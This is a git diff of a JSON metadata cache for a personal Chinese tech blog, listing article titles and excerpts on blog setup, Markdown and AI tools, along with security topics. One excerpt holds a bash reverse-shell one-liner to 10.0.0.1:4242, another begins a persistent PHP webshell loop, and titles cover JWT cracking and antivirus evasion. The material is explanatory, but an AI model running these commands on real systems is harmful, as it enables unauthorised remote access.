@@ -3,12 +3,12 @@
     {
       "id": 206320978,
       "doc_id": "on578p3peeqksucw",
-      "updated": 1739899889000,
+      "updated": 1742824532000,
       "properties": {
         "title": "本blog的搭建",
         "urlname": "on578p3peeqksucw",
         "date": "2025-02-17 22:34:56",
-        "updated": "2025-02-19 01:31:29",
+        "updated": "2025-03-24 21:55:32",
         "author": "孙武",
         "cover": "https://cdn.nlark.com/yuque/0/2025/png/26698826/1739803976612-3af47b2e-5e9e-4e54-8354-e593e1a7bd46.png",
         "description": "1.  博客介绍使用vitepress框架+github存储+Elog+语雀写作+vercel部署+自定义域名子夜旅馆2. 部署2.1. VitePressVitePress 官网：VitePress 中文版2.1.1. 什么是 VitePressVitePress 是一个静态站点生成器 (S..."
@@ -27,12 +27,12 @@
     {
       "id": 148986770,
       "doc_id": "cc6cb6af50f74808fa4e0c665f87159a",
-      "updated": 1739899892000,
+      "updated": 1741103785000,
       "properties": {
         "title": "markdown语法",
         "urlname": "cc6cb6af50f74808fa4e0c665f87159a",
         "date": "2023-12-03 17:14:50",
-        "updated": "2025-02-19 01:31:32",
+        "updated": "2025-03-04 23:56:25",
         "author": "孙武",
         "description": "markdown的使用说明一、标题语法：# (一级标题)  ## (二级标题)  ### (三级标题) ......代码：# 这是一级标题 ## 这是二级标题效果:  这是一级标题这是二级标题快捷键:Ctrl+数字1~6可以快速将选中的文本调成对应级别的标题Ctrl+0可以快速将选中的文本调成..."
       },
@@ -50,12 +50,12 @@
     {
       "id": 206481403,
       "doc_id": "pgf5950f9yu6dlma",
-      "updated": 1739899885000,
+      "updated": 1741103855000,
       "properties": {
         "title": "语雀转vitepress示例代码",
         "urlname": "pgf5950f9yu6dlma",
         "date": "2025-02-18 20:50:11",
-        "updated": "2025-02-19 01:31:25",
+        "updated": "2025-03-04 23:57:35",
         "author": "孙武",
         "cover": "https://cdn.nlark.com/yuque/0/2023/png/417081/1682313146385-a61870b7-6a26-45a5-977f-983a5317746f.png",
         "description": "1.图片2.表格字段备注name名称age年龄3.附件测试文本1.docx4.状态计划中未完成已完成布局和样式1.高亮块蓝色背景高亮块:::tips灰色背景高亮:::color1天蓝:::color2翠绿:::success绿色:::color3黄色:::danger橙粉:::color4粉色..."
@@ -73,12 +73,12 @@
     {
       "id": 206488350,
       "doc_id": "odihxemydqo73zpz",
-      "updated": 1739900678000,
+      "updated": 1741103859000,
       "properties": {
         "title": "cursor+deepseek编程",
         "urlname": "odihxemydqo73zpz",
         "date": "2025-02-18 21:50:42",
-        "updated": "2025-02-19 01:44:38",
+        "updated": "2025-03-04 23:57:39",
         "author": "孙武",
         "cover": "https://cdn.nlark.com/yuque/0/2025/png/26698826/1739887077637-4c521a76-99ff-4728-b5a5-753c208acbcc.png",
         "description": "1. cursor是什么?cursor是openAi合作伙伴推出的，内置GPT-4的编辑器，能更好的为开发者服务。关键是是他是免费的。cursor不用梯子也能用，支持多种语言：python，java，C#等等语言，也同样支持在多平台安装。可以用于聊天，辅助写代码，辅助写作等等功能。相信你试用了..."
@@ -91,6 +91,363 @@
       ],
       "realName": "cursor+deepseek编程",
       "relativePath": "\\关于\\cursor+deepseek编程.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 211004886,
+      "doc_id": "qlc13al0flbxrsoc",
+      "updated": 1742225934000,
+      "properties": {
+        "title": "jwt爆破",
+        "urlname": "qlc13al0flbxrsoc",
+        "date": "2025-03-17 22:25:04",
+        "updated": "2025-03-17 23:38:54",
+        "author": "孙武",
+        "description": "1. 什么是jwt？1.1. 使用 Hashcat 爆破 JWT（JSON Web Token）JWT 主要由三部分组成：Header（头部）Payload（负载）Signature（签名）其中，Signature 是基于 HMAC、RSA 或 ECDSA 进行签名的。Hashcat 只能破解..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "qlc13al0flbxrsoc"
+        }
+      ],
+      "realName": "jwt爆破",
+      "relativePath": "\\关于\\jwt爆破.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 207902898,
+      "doc_id": "qy77g34sw8pf6knc",
+      "updated": 1742483400000,
+      "properties": {
+        "title": "关于大模型DeepSeek构建个人知识库的搭建(RAG)",
+        "urlname": "qy77g34sw8pf6knc",
+        "date": "2025-02-27 14:39:54",
+        "updated": "2025-03-20 23:10:00",
+        "author": "孙武",
+        "cover": "https://cdn.nlark.com/yuque/0/2025/png/26698826/1740645822668-15e983ad-dd05-4dc8-9f1a-2f93db47d13a.png",
+        "description": "1. 前言由于笔记越写越多，在一堆笔记中进行查找费时费力，还要经常整理，更新。在黑神话悟空出来之后，b站有个up主将大量黑神话所参考的文献投喂给大模型，使用大模型制作多个agent智能体，将多个agent智能体以工作流的形式进行编排，制作出一个黑神话悟空的背景故事问答助手，准确率非常高，恰好前..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "qy77g34sw8pf6knc"
+        }
+      ],
+      "realName": "关于大模型DeepSeek构建个人知识库的搭建(RAG)",
+      "relativePath": "\\关于\\关于大模型DeepSeek构建个人知识库的搭建(RAG).md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 197922137,
+      "doc_id": "sn6gag6wxfr6agxc",
+      "updated": 1741103681000,
+      "properties": {
+        "title": "echo命令在攻击中应用",
+        "urlname": "sn6gag6wxfr6agxc",
+        "date": "2024-12-09 18:22:45",
+        "updated": "2025-03-04 23:54:41",
+        "author": "孙武",
+        "description": "echo 命令可以将后面跟的字符进行输出 echo \"Hello LiangZai\" #显示字符串 echo \"$str, Good morning #显示变量的值 echo -e \"Liang \\nZai\" #反斜杠转义常见选项：-E 默认不支持解释功能-n 不自动换行-e 启用\\字符的解释..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "sn6gag6wxfr6agxc"
+        }
+      ],
+      "realName": "echo命令在攻击中应用",
+      "relativePath": "\\关于\\echo命令在攻击中应用.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 197922027,
+      "doc_id": "wa8llonlfvac7wy8",
+      "updated": 1741103687000,
+      "properties": {
+        "title": "反弹SHell原理与检测思路",
+        "urlname": "wa8llonlfvac7wy8",
+        "date": "2024-12-09 18:21:11",
+        "updated": "2025-03-04 23:54:47",
+        "author": "孙武",
+        "cover": "https://cdn.nlark.com/yuque/0/2024/png/26698826/1733740007316-b12fb3a9-1f27-4827-a29b-e16419634fc0.png",
+        "description": "反弹Shell及检测bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1进程的 0 1 2 输入输出重定向到远程socket，由socket中获取输入，重定向标准输出（1）和错误输出（2）到socket。bash -ibash是Linux较为常见的Shell，除此还有z..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "wa8llonlfvac7wy8"
+        }
+      ],
+      "realName": "反弹SHell原理与检测思路",
+      "relativePath": "\\关于\\反弹SHell原理与检测思路.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 197921828,
+      "doc_id": "lu9u7xf8t8w37le5",
+      "updated": 1741103698000,
+      "properties": {
+        "title": "文本处理",
+        "urlname": "lu9u7xf8t8w37le5",
+        "date": "2024-12-09 18:18:18",
+        "updated": "2025-03-04 23:54:58",
+        "author": "孙武",
+        "description": "awk、grep、sed是linux操作文本的三大利器，合称文本三剑客。文本处理三剑客之grep grep 文本搜索工具-v #显示不被匹配的行-i #忽略字符大小写-n #显示匹配的行号-c #统计匹配的行数-o #仅显示匹配的字符串-q #静默模式，不输出任何信息#查看当前主机连接数最多的..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "lu9u7xf8t8w37le5"
+        }
+      ],
+      "realName": "文本处理",
+      "relativePath": "\\关于\\文本处理.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 148986797,
+      "doc_id": "76cf879ecc21821cb10b3bcbcb825a7e",
+      "updated": 1741103668000,
+      "properties": {
+        "title": "百分百进行new-bing聊天，跳过候补名单",
+        "urlname": "76cf879ecc21821cb10b3bcbcb825a7e",
+        "date": "2023-12-03 17:15:05",
+        "updated": "2025-03-04 23:54:28",
+        "author": "孙武",
+        "description": "准备一个163的邮箱一个edge浏览器开始 在edge浏览器中，直接访问https://sl.bing.net/krmHHLCa1My  使用163邮箱进行注册并登录Microsoft  登录完成即可体验Bing"
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "76cf879ecc21821cb10b3bcbcb825a7e"
+        }
+      ],
+      "realName": "百分百进行new-bing聊天，跳过候补名单",
+      "relativePath": "\\关于\\百分百进行new-bing聊天，跳过候补名单.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 191272126,
+      "doc_id": "vhzfctc2vvd0cn12",
+      "updated": 1741103703000,
+      "properties": {
+        "title": "代理抓包",
+        "urlname": "vhzfctc2vvd0cn12",
+        "date": "2024-10-22 11:02:28",
+        "updated": "2025-03-04 23:55:03",
+        "author": "孙武",
+        "cover": "https://cdn.nlark.com/yuque/0/2024/png/26698826/1714901189057-28dbd7ce-5c6f-4662-957d-12f2a157aa5e.png",
+        "description": "1. chrome浏览器--&gt;burp1.1. 安装chrome浏览器及代理插件google浏览器下载(https://www.google.com/chrome/next-steps.html?brand=FKPE&amp;statcb=1&amp;installdataindex=empty&amp;defaul..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "vhzfctc2vvd0cn12"
+        }
+      ],
+      "realName": "代理抓包",
+      "relativePath": "\\关于\\代理抓包.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 148993546,
+      "doc_id": "ktlz2f4rgb1x5zyv",
+      "updated": 1741103720000,
+      "properties": {
+        "title": "Typora",
+        "urlname": "ktlz2f4rgb1x5zyv",
+        "date": "2023-12-03 19:06:35",
+        "updated": "2025-03-04 23:55:20",
+        "author": "孙武",
+        "description": "markdown的使用说明一、标题语法：# (一级标题)  ## (二级标题)  ### (三级标题) ......代码： # 这是一级标题 ## 这是二级标题效果: 这是一级标题 这是二级标题快捷键: Ctrl+数字1~6可以快速将选中的文本调成对应级别的标题Ctrl+0可以快速将选中的文本..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "ktlz2f4rgb1x5zyv"
+        }
+      ],
+      "realName": "Typora",
+      "relativePath": "\\关于\\Typora.md",
+      "needUpdate": 1,
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 148986793,
+      "doc_id": "f3cb198a616acdd56f37f305ce6c228c",
+      "updated": 1741103724000,
+      "properties": {
+        "title": "权限维持",
+        "urlname": "f3cb198a616acdd56f37f305ce6c228c",
+        "date": "2023-12-03 17:15:03",
+        "updated": "2025-03-04 23:55:24",
+        "author": "孙武",
+        "description": "windowsphp不死马php ignore_user_abort(); //关掉浏览器，PHP脚本也可以继续执行. set_time_limit(0);//通过set_time_limit(0)可以让程序无限制的执行下去 $interval = 5; // 每隔*秒运行 do { $f..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "f3cb198a616acdd56f37f305ce6c228c"
+        }
+      ],
+      "realName": "权限维持",
+      "relativePath": "\\关于\\权限维持.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 148986792,
+      "doc_id": "8b178aab5fb2c31b010a6823e06b9a9f",
+      "updated": 1741103755000,
+      "properties": {
+        "title": "护网题库",
+        "urlname": "8b178aab5fb2c31b010a6823e06b9a9f",
+        "date": "2023-12-03 17:15:01",
+        "updated": "2025-03-04 23:55:55",
+        "author": "孙武",
+        "description": "整理了一些各个厂商的一些面试问题题目不分中级还是初级，题目不分前后，总的来说，唬得住5000，唬不住500,给的回答仅供参考开头简单的做个自我介绍xxxxx（此处省略若干字，最主要是说了自己在漏洞平台擅长挖掘的漏洞类型以及src经历,一些项目经验，吹点牛就行）看到你简历上面有说有过项目经历，可..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "8b178aab5fb2c31b010a6823e06b9a9f"
+        }
+      ],
+      "realName": "护网题库",
+      "relativePath": "\\关于\\护网题库.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 148986791,
+      "doc_id": "0702f5e2fee312a06ed96d135a8eb292",
+      "updated": 1741528826000,
+      "properties": {
+        "title": "利用github搭建hexo博客",
+        "urlname": "0702f5e2fee312a06ed96d135a8eb292",
+        "date": "2023-12-03 17:15:00",
+        "updated": "2025-03-09 22:00:26",
+        "author": "孙武",
+        "description": "参考链接主要参考准备前提提前安装好node.js左边的那个https://nodejs.org/en提前安装好Githttps://git-scm.com/downloads提前注册好一个github账号如果文章图片没有显示，请自行挂代理操作步骤在本地找个目录放博客源文件，路径不要有中文在选定..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "0702f5e2fee312a06ed96d135a8eb292"
+        }
+      ],
+      "realName": "利用github搭建hexo博客",
+      "relativePath": "\\关于\\利用github搭建hexo博客.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 148986785,
+      "doc_id": "b538ee95b1220b081f05a6a765f9a5d6",
+      "updated": 1741103656000,
+      "properties": {
+        "title": "免杀第一课",
+        "urlname": "b538ee95b1220b081f05a6a765f9a5d6",
+        "date": "2023-12-03 17:14:58",
+        "updated": "2025-03-04 23:54:16",
+        "author": "孙武",
+        "description": "免杀杀软介绍报警层级正常可疑恶意查杀方式静态查杀正则规则匹配(virtualalloc，rtlmovememory，ntcreatthread，shellcode，指令，名字等)汇编的控制流结构解释型语言下的cnn动态查杀对进程和命令的识别(下载、加密、cmd、powershell、wmi、p..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "b538ee95b1220b081f05a6a765f9a5d6"
+        }
+      ],
+      "realName": "免杀第一课",
+      "relativePath": "\\关于\\免杀第一课.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 148986783,
+      "doc_id": "bc70e70cfce286a2a3f66f1f7d0e02ed",
+      "updated": 1741103675000,
+      "properties": {
+        "title": "使用chatGPT写论文方法",
+        "urlname": "bc70e70cfce286a2a3f66f1f7d0e02ed",
+        "date": "2023-12-03 17:14:56",
+        "updated": "2025-03-04 23:54:35",
+        "author": "孙武",
+        "description": "概述使用chatGPT写论文需要一定的话术流程提供专业，对论文的要求，是容易点还是要具有创造性我是一个大学生,专业是网络专业，现在要写毕业论文，请为我提供5个容易写的选题选定题目，不满意可以重新生成请把第5个生成论文摘要，字数300左右生成大纲请根据以上摘要，查询相关文献，生成论文大纲逐步生成..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "bc70e70cfce286a2a3f66f1f7d0e02ed"
+        }
+      ],
+      "realName": "使用chatGPT写论文方法",
+      "relativePath": "\\关于\\使用chatGPT写论文方法.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 148986774,
+      "doc_id": "bcdbcbb3872aaa2bba70f16be2c31093",
+      "updated": 1741103720000,
+      "properties": {
+        "title": "typora+PicGo+LskyPro+Obsidian实现文章管理",
+        "urlname": "bcdbcbb3872aaa2bba70f16be2c31093",
+        "date": "2023-12-03 17:14:52",
+        "updated": "2025-03-04 23:55:20",
+        "author": "孙武",
+        "description": "typora+PicGo+LskyPro(github)+Obsidian介绍typora是一个Markdown格式的编辑器PicGo是一个自动上传图片到图床的工具LskyPro是一个图床Obsidian是一个.md文档整理关联工具参考链接Lsky Pro搭建Lskypro搭建Lsky Pro..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "bcdbcbb3872aaa2bba70f16be2c31093"
+        }
+      ],
+      "realName": "typora+PicGo+LskyPro+Obsidian实现文章管理",
+      "relativePath": "\\关于\\typora+PicGo+LskyPro+Obsidian实现文章管理.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 148986772,
+      "doc_id": "c5373bf7dfceca4cdcc33fad1df55971",
+      "updated": 1741103659000,
+      "properties": {
+        "title": "mysql安装",
+        "urlname": "c5373bf7dfceca4cdcc33fad1df55971",
+        "date": "2023-12-03 17:14:51",
+        "updated": "2025-03-04 23:54:19",
+        "author": "孙武",
+        "description": "(48条消息) MySql免安装版及其配置_可爱发的博客-CSDN博客解压下载好的zip文件/bin路径添加到path路径mysqld.exe -remove mysqld -install net start mysql mysqld --initialize --console   mys..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "c5373bf7dfceca4cdcc33fad1df55971"
+        }
+      ],
+      "realName": "mysql安装",
+      "relativePath": "\\关于\\mysql安装.md",
+      "docPath": "docs\\docs\\关于"
+    },
+    {
+      "id": 148962796,
+      "doc_id": "bsxftx0tg362oxig",
+      "updated": 1741103664000,
+      "properties": {
+        "title": "hexo+语雀",
+        "urlname": "bsxftx0tg362oxig",
+        "date": "2023-12-03 11:34:03",
+        "updated": "2025-03-04 23:54:24",
+        "author": "孙武",
+        "cover": "https://cdn.nlark.com/yuque/0/2023/png/26698826/1701586947249-36adf0c7-76a2-4158-a706-c642b67ee6a4.png",
+        "description": "Hexo 博客终极玩法：云端写作，自动部署GitHub - x-cold/yuque-hexo: 同步语雀的文章到你的 Hexo 项目吧！主要靠这个https://zhuanlan.zhihu.com/p/577256660package.json配置文件此处为语雀加密文本卡片，点击链接查看：..."
+      },
+      "catalog": [
+        {
+          "title": "关于",
+          "doc_id": "bsxftx0tg362oxig"
+        }
+      ],
+      "realName": "hexo+语雀",
+      "relativePath": "\\关于\\hexo+语雀.md",
       "docPath": "docs\\docs\\关于"
     }
   ],
@@ -127,8 +484,278 @@
       "visible": 1,
       "prev_uuid": "hOz82r2UAacCtoym",
       "sibling_uuid": "",
-      "child_uuid": "AJ9fLKqq6KXEOGo8",
+      "child_uuid": "ANwb_V9L0jxW2U4j",
       "parent_uuid": "",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "ANwb_V9L0jxW2U4j",
+      "type": "DOC",
+      "title": "jwt爆破",
+      "url": "qlc13al0flbxrsoc",
+      "slug": "qlc13al0flbxrsoc",
+      "id": 211004886,
+      "doc_id": 211004886,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "GxObxeQiBqbu0XuS",
+      "sibling_uuid": "XlMIXHgHthYpFMJ8",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "XlMIXHgHthYpFMJ8",
+      "type": "DOC",
+      "title": "利用github搭建hexo博客",
+      "url": "0702f5e2fee312a06ed96d135a8eb292",
+      "slug": "0702f5e2fee312a06ed96d135a8eb292",
+      "id": 148986791,
+      "doc_id": 148986791,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "ANwb_V9L0jxW2U4j",
+      "sibling_uuid": "QqPE7X6l4LN30gJB",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "QqPE7X6l4LN30gJB",
+      "type": "DOC",
+      "title": "免杀第一课",
+      "url": "b538ee95b1220b081f05a6a765f9a5d6",
+      "slug": "b538ee95b1220b081f05a6a765f9a5d6",
+      "id": 148986785,
+      "doc_id": 148986785,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "XlMIXHgHthYpFMJ8",
+      "sibling_uuid": "0IMOYDXIFlp3dsgM",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "0IMOYDXIFlp3dsgM",
+      "type": "DOC",
+      "title": "mysql安装",
+      "url": "c5373bf7dfceca4cdcc33fad1df55971",
+      "slug": "c5373bf7dfceca4cdcc33fad1df55971",
+      "id": 148986772,
+      "doc_id": 148986772,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "QqPE7X6l4LN30gJB",
+      "sibling_uuid": "uF2Xe4yQGyNZpkWM",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "uF2Xe4yQGyNZpkWM",
+      "type": "DOC",
+      "title": "hexo+语雀",
+      "url": "bsxftx0tg362oxig",
+      "slug": "bsxftx0tg362oxig",
+      "id": 148962796,
+      "doc_id": 148962796,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "0IMOYDXIFlp3dsgM",
+      "sibling_uuid": "ec8Mh8-um2OVG473",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "ec8Mh8-um2OVG473",
+      "type": "DOC",
+      "title": "百分百进行new-bing聊天，跳过候补名单",
+      "url": "76cf879ecc21821cb10b3bcbcb825a7e",
+      "slug": "76cf879ecc21821cb10b3bcbcb825a7e",
+      "id": 148986797,
+      "doc_id": 148986797,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "uF2Xe4yQGyNZpkWM",
+      "sibling_uuid": "rdroWIRQ7MBrTDGL",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "rdroWIRQ7MBrTDGL",
+      "type": "DOC",
+      "title": "使用chatGPT写论文方法",
+      "url": "bc70e70cfce286a2a3f66f1f7d0e02ed",
+      "slug": "bc70e70cfce286a2a3f66f1f7d0e02ed",
+      "id": 148986783,
+      "doc_id": 148986783,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "ec8Mh8-um2OVG473",
+      "sibling_uuid": "onaZmI3ZjFxGHaDE",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "onaZmI3ZjFxGHaDE",
+      "type": "DOC",
+      "title": "echo命令在攻击中应用",
+      "url": "sn6gag6wxfr6agxc",
+      "slug": "sn6gag6wxfr6agxc",
+      "id": 197922137,
+      "doc_id": 197922137,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "rdroWIRQ7MBrTDGL",
+      "sibling_uuid": "3ZtjDhxqenxLg25J",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "3ZtjDhxqenxLg25J",
+      "type": "DOC",
+      "title": "反弹SHell原理与检测思路",
+      "url": "wa8llonlfvac7wy8",
+      "slug": "wa8llonlfvac7wy8",
+      "id": 197922027,
+      "doc_id": 197922027,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "onaZmI3ZjFxGHaDE",
+      "sibling_uuid": "lZIppBIEWx-PaJhp",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "lZIppBIEWx-PaJhp",
+      "type": "DOC",
+      "title": "文本处理",
+      "url": "lu9u7xf8t8w37le5",
+      "slug": "lu9u7xf8t8w37le5",
+      "id": 197921828,
+      "doc_id": 197921828,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "3ZtjDhxqenxLg25J",
+      "sibling_uuid": "aFZGipfrizbobTCg",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "aFZGipfrizbobTCg",
+      "type": "DOC",
+      "title": "代理抓包",
+      "url": "vhzfctc2vvd0cn12",
+      "slug": "vhzfctc2vvd0cn12",
+      "id": 191272126,
+      "doc_id": 191272126,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "lZIppBIEWx-PaJhp",
+      "sibling_uuid": "SdNqK4ohhbs27fdy",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "SdNqK4ohhbs27fdy",
+      "type": "DOC",
+      "title": "Typora",
+      "url": "ktlz2f4rgb1x5zyv",
+      "slug": "ktlz2f4rgb1x5zyv",
+      "id": 148993546,
+      "doc_id": 148993546,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "aFZGipfrizbobTCg",
+      "sibling_uuid": "rwWqZqrrJuVhDZxl",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "rwWqZqrrJuVhDZxl",
+      "type": "DOC",
+      "title": "typora+PicGo+LskyPro+Obsidian实现文章管理",
+      "url": "bcdbcbb3872aaa2bba70f16be2c31093",
+      "slug": "bcdbcbb3872aaa2bba70f16be2c31093",
+      "id": 148986774,
+      "doc_id": 148986774,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "SdNqK4ohhbs27fdy",
+      "sibling_uuid": "BvOQwyCId6yIx_yM",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "BvOQwyCId6yIx_yM",
+      "type": "DOC",
+      "title": "权限维持",
+      "url": "f3cb198a616acdd56f37f305ce6c228c",
+      "slug": "f3cb198a616acdd56f37f305ce6c228c",
+      "id": 148986793,
+      "doc_id": 148986793,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "rwWqZqrrJuVhDZxl",
+      "sibling_uuid": "vrCBMPGSnLSv_7o2",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "vrCBMPGSnLSv_7o2",
+      "type": "DOC",
+      "title": "护网题库",
+      "url": "8b178aab5fb2c31b010a6823e06b9a9f",
+      "slug": "8b178aab5fb2c31b010a6823e06b9a9f",
+      "id": 148986792,
+      "doc_id": 148986792,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "BvOQwyCId6yIx_yM",
+      "sibling_uuid": "AJ9fLKqq6KXEOGo8",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
       "_serializer": "v2.toc_item"
     },
     {
@@ -143,7 +770,7 @@
       "depth": 2,
       "open_window": 1,
       "visible": 1,
-      "prev_uuid": "GxObxeQiBqbu0XuS",
+      "prev_uuid": "vrCBMPGSnLSv_7o2",
       "sibling_uuid": "tU-9xVTk40BmwlQF",
       "child_uuid": "",
       "parent_uuid": "GxObxeQiBqbu0XuS",
@@ -198,6 +825,24 @@
       "open_window": 1,
       "visible": 1,
       "prev_uuid": "xpEYeUgbaJc4JMw2",
+      "sibling_uuid": "9GNEgKQ9g4vbGf2i",
+      "child_uuid": "",
+      "parent_uuid": "GxObxeQiBqbu0XuS",
+      "_serializer": "v2.toc_item"
+    },
+    {
+      "uuid": "9GNEgKQ9g4vbGf2i",
+      "type": "DOC",
+      "title": "关于大模型DeepSeek构建个人知识库的搭建(RAG)",
+      "url": "qy77g34sw8pf6knc",
+      "slug": "qy77g34sw8pf6knc",
+      "id": 207902898,
+      "doc_id": 207902898,
+      "level": 1,
+      "depth": 2,
+      "open_window": 1,
+      "visible": 1,
+      "prev_uuid": "EFNsQ266zaSgGbbL",
       "sibling_uuid": "",
       "child_uuid": "",
       "parent_uuid": "GxObxeQiBqbu0XuS",
